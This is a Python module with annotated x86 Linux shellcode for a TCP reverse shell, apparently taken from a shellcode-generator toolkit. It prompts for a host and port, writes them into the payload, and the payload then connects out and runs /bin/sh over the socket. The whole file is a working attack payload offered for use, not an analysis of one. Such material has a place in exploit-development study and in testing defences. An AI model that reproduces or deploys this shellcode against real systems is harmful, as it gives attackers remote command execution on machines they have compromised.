############################################################################################
# title         : x86_linux_reverse-shell-tcp
# description   : Shellcode for x86 GNU/Linux systems that open a reverse shell over TCP
# author        : Leo 'cryptobioz' Depriester <leo.depriester@exadot.fr>
# date          : 2016/07/25
# version       : 1.0
#############################################################################################
import struct, socket
class Shellcode:
    @staticmethod
    def get():
        shellcode = Shellcode.shellcode
        
        # Define host
        host = raw_input("Host [127.0.0.1] : ")
        if not host:
            host = "127.0.0.1"
        try:
            host = socket.inet_aton(host)
        except socket.error:
            print "[-] This is not an IP adress."
            exit(1)
        if "\x00" in host:
            print "[-] The hex value of your IP adress contains \\x00."
            exit(1)
        shellcode = shellcode.replace(b"\x68\x7f\x7f\x7f\x7f", b"\x68"+host)
    
        # Define port
        port = raw_input("Port [4444] : ")
        if not port:
            port = 4444      
        port = struct.pack(">H", port)
        if "\x00" in port:
            print "[-] The hex value of your port number (%s) contains \\x00." % port
            exit(1)
        else:
            shellcode = shellcode.replace(b"\x66\x68\x41\x42", b"\x66\x68"+port)
        

        return shellcode
        
    shellcode = (
        "\x31\xdb"               # 0x00000000:     xor ebx,ebx
        "\x53"                   # 0x00000002:     push ebx
        "\x43"                   # 0x00000003:     inc ebx
        "\x53"                   # 0x00000004:     push ebx
        "\x6a\x02"               # 0x00000005:     push byte +0x2
        "\x6a\x66"               # 0x00000007:     push byte +0x66
        "\x58"                   # 0x00000009:     pop eax
        "\x89\xe1"               # 0x0000000A:     mov ecx,esp
        "\xcd\x80"               # 0x0000000C:     int 0x80 ; socket()
        "\x93"                   # 0x0000000E:     xchg eax,ebx
        "\x59"                   # 0x0000000F:     pop ecx
        "\xb0\x3f"               # 0x00000010:     mov al,0x3f
        "\xcd\x80"               # 0x00000012:     int 0x80 ; dup2()
        "\x49"                   # 0x00000014:     dec ecx
        "\x79\xf9"               # 0x00000015:     jns 0x10
        "\x5b"                   # 0x00000017:     pop ebx
        "\x5a"                   # 0x00000018:     pop edx
        "\x68\x7f\x7f\x7f\x7f"   # 0x00000019:     push dword 0x7f7f7f7f ; address = 127.127.127.127
        "\x66\x68\x41\x42"       # 0x0000001E:     push word 0x4241 ; port = 0x4142
        "\x43"                   # 0x00000022:     inc ebx
        "\x66\x53"               # 0x00000023:     push bx
        "\x89\xe1"               # 0x00000025:     mov ecx,esp
        "\xb0\x66"               # 0x00000027:     mov al,0x66
        "\x50"                   # 0x00000029:     push eax
        "\x51"                   # 0x0000002A:     push ecx
        "\x53"                   # 0x0000002B:     push ebx
        "\x89\xe1"               # 0x0000002C:     mov ecx,esp
        "\x43"                   # 0x0000002E:     inc ebx
        "\xcd\x80"               # 0x0000002F:     int 0x80 ; connect()
        "\x52"                   # 0x00000031:     push edx
        "\x68\x2f\x2f\x73\x68"   # 0x00000032:     push dword 0x68732f2f ; //sh
        "\x68\x2f\x62\x69\x6e"   # 0x00000037:     push dword 0x6e69622f ; /bin
        "\x89\xe3"               # 0x0000003C:     mov ebx,esp
        "\x52"                   # 0x0000003E:     push edx
        "\x53"                   # 0x0000003F:     push ebx
        "\x89\xe1"               # 0x00000040:     mov ecx,esp
        "\xb0\x0b"               # 0x00000042:     mov al,0xb
        "\xcd\x80"               # 0x00000044:     int 0x80 ; execve()    
    )
